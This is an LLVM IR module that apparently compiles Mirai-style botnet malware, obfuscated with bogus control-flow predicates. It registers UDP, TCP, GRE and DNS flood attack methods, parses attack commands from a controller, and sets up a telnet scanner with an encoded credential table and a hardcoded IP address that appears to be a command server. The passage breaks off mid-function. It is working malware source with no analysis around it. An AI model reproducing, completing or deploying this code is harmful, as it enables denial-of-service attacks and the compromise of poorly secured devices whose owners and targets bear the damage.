; ModuleID = 'host/ir_bcf/Extendo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"191.96.112.109\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = shl i32 %59, 1
  %_1 = sub i32 %59, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 0, %59
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %59, 1
  %_5 = sub i32 0, %59
  %gen6 = add i32 %_5, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_7 = sub i64 %61, 8
  %gen8 = mul i64 %_7, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_9 = shl i8 %67, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %53, %0
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = load i32, i32* %1, align 4
  %12 = icmp slt i32 %11, 15
  %13 = load i32, i32* @x.5
  %14 = load i32, i32* @y.6
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %12, label %21, label %56

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %23
  %25 = load i32, i32* %24, align 4
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %33

; <label>:27:                                     ; preds = %21
  %28 = load i32, i32* %1, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = call i32 @kill(i32 %31, i32 9) #6
  br label %33

; <label>:33:                                     ; preds = %27, %21
  %34 = load i32, i32* @x.5
  %35 = load i32, i32* @y.6
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %1, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %43
  store i32 0, i32* %44, align 4
  %45 = load i32, i32* @x.5
  %46 = load i32, i32* @y.6
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %53

; <label>:53:                                     ; preds = %originalBBpart24
  %54 = load i32, i32* %1, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %1, align 4
  br label %2

; <label>:56:                                     ; preds = %originalBBpart2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %57 = load i32, i32* %1, align 4
  %58 = icmp slt i32 %57, 15
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %59 = load i32, i32* %1, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %60
  store i32 0, i32* %61, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.7
  %4 = load i32, i32* @y.8
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %299

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %11, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #7
  store i32 %37, i32* %14, align 4
  %38 = load i8*, i8** %11, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %11, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %299

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %11, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %11, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %15, align 1
  %51 = load i32, i32* %12, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 1
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %12, align 4
  %55 = load i32, i32* %12, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %47
  br label %299

; <label>:58:                                     ; preds = %47
  %59 = load i8*, i8** %11, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %11, align 8
  %61 = load i8, i8* %59, align 1
  store i8 %61, i8* %16, align 1
  %62 = load i32, i32* %12, align 4
  %63 = sext i32 %62 to i64
  %64 = sub i64 %63, 1
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %12, align 4
  %66 = load i8, i8* %16, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %58
  br label %299

; <label>:70:                                     ; preds = %58
  %71 = load i32, i32* %12, align 4
  %72 = sext i32 %71 to i64
  %73 = load i8, i8* %16, align 1
  %74 = zext i8 %73 to i64
  %75 = mul i64 5, %74
  %76 = icmp ult i64 %72, %75
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %70
  %78 = load i32, i32* @x.7
  %79 = load i32, i32* @y.8
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %77
  %86 = load i32, i32* @x.7
  %87 = load i32, i32* @y.8
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %299

; <label>:94:                                     ; preds = %70
  %95 = load i32, i32* @x.7
  %96 = load i32, i32* @y.8
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i8, i8* %16, align 1
  %104 = zext i8 %103 to i64
  %105 = call noalias i8* @calloc(i64 %104, i64 24) #6
  %106 = bitcast i8* %105 to %struct.attack_target*
  store %struct.attack_target* %106, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  %107 = load i32, i32* @x.7
  %108 = load i32, i32* @y.8
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %162, %originalBBpart28
  %116 = load i32, i32* %13, align 4
  %117 = load i8, i8* %16, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %165

; <label>:120:                                    ; preds = %115
  %121 = load i8*, i8** %11, align 8
  %122 = bitcast i8* %121 to i32*
  %123 = load i32, i32* %122, align 4
  %124 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %125 = load i32, i32* %13, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 1
  store i32 %123, i32* %128, align 4
  %129 = load i8*, i8** %11, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 4
  store i8* %130, i8** %11, align 8
  %131 = load i8*, i8** %11, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %11, align 8
  %133 = load i8, i8* %131, align 1
  %134 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %135 = load i32, i32* %13, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  store i8 %133, i8* %138, align 4
  %139 = load i32, i32* %12, align 4
  %140 = sext i32 %139 to i64
  %141 = sub i64 %140, 5
  %142 = trunc i64 %141 to i32
  store i32 %142, i32* %12, align 4
  %143 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %144 = load i32, i32* %13, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i64 %145
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i32 0, i32 0
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %147, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %150 = load i32, i32* %13, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %156 = load i32, i32* %13, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i64 %157
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i32 0, i32 0
  %160 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %159, i32 0, i32 2
  %161 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %160, i32 0, i32 0
  store i32 %154, i32* %161, align 4
  br label %162

; <label>:162:                                    ; preds = %120
  %163 = load i32, i32* %13, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %13, align 4
  br label %115

; <label>:165:                                    ; preds = %115
  %166 = load i32, i32* %12, align 4
  %167 = sext i32 %166 to i64
  %168 = icmp ult i64 %167, 1
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %165
  br label %299

; <label>:170:                                    ; preds = %165
  %171 = load i8*, i8** %11, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %11, align 8
  %173 = load i8, i8* %171, align 1
  store i8 %173, i8* %17, align 1
  %174 = load i32, i32* %12, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, 1
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %12, align 4
  %178 = load i8, i8* %17, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp sgt i32 %179, 0
  br i1 %180, label %181, label %291

; <label>:181:                                    ; preds = %170
  %182 = load i8, i8* %17, align 1
  %183 = zext i8 %182 to i64
  %184 = call noalias i8* @calloc(i64 %183, i64 16) #6
  %185 = bitcast i8* %184 to %struct.attack_option*
  store %struct.attack_option* %185, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %186

; <label>:186:                                    ; preds = %originalBBpart212, %181
  %187 = load i32, i32* %13, align 4
  %188 = load i8, i8* %17, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %274

; <label>:191:                                    ; preds = %186
  %192 = load i32, i32* %12, align 4
  %193 = sext i32 %192 to i64
  %194 = icmp ult i64 %193, 1
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %191
  br label %299

; <label>:196:                                    ; preds = %191
  %197 = load i8*, i8** %11, align 8
  %198 = getelementptr inbounds i8, i8* %197, i32 1
  store i8* %198, i8** %11, align 8
  %199 = load i8, i8* %197, align 1
  %200 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %201 = load i32, i32* %13, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %203, i32 0, i32 1
  store i8 %199, i8* %204, align 8
  %205 = load i32, i32* %12, align 4
  %206 = sext i32 %205 to i64
  %207 = sub i64 %206, 1
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %12, align 4
  %209 = load i32, i32* %12, align 4
  %210 = sext i32 %209 to i64
  %211 = icmp ult i64 %210, 1
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %196
  br label %299

; <label>:213:                                    ; preds = %196
  %214 = load i8*, i8** %11, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %11, align 8
  %216 = load i8, i8* %214, align 1
  store i8 %216, i8* %20, align 1
  %217 = load i32, i32* %12, align 4
  %218 = sext i32 %217 to i64
  %219 = sub i64 %218, 1
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %12, align 4
  %221 = load i32, i32* %12, align 4
  %222 = load i8, i8* %20, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp slt i32 %221, %223
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %213
  br label %299

; <label>:226:                                    ; preds = %213
  %227 = load i8, i8* %20, align 1
  %228 = zext i8 %227 to i32
  %229 = add nsw i32 %228, 1
  %230 = sext i32 %229 to i64
  %231 = call noalias i8* @calloc(i64 %230, i64 1) #6
  %232 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %233 = load i32, i32* %13, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %235, i32 0, i32 0
  store i8* %231, i8** %236, align 8
  %237 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %238 = load i32, i32* %13, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %240, i32 0, i32 0
  %242 = load i8*, i8** %241, align 8
  %243 = load i8*, i8** %11, align 8
  %244 = load i8, i8* %20, align 1
  %245 = zext i8 %244 to i32
  call void @util_memcpy(i8* %242, i8* %243, i32 %245)
  %246 = load i8, i8* %20, align 1
  %247 = zext i8 %246 to i32
  %248 = load i8*, i8** %11, align 8
  %249 = sext i32 %247 to i64
  %250 = getelementptr inbounds i8, i8* %248, i64 %249
  store i8* %250, i8** %11, align 8
  %251 = load i8, i8* %20, align 1
  %252 = zext i8 %251 to i32
  %253 = load i32, i32* %12, align 4
  %254 = sub nsw i32 %253, %252
  store i32 %254, i32* %12, align 4
  br label %255

; <label>:255:                                    ; preds = %226
  %256 = load i32, i32* @x.7
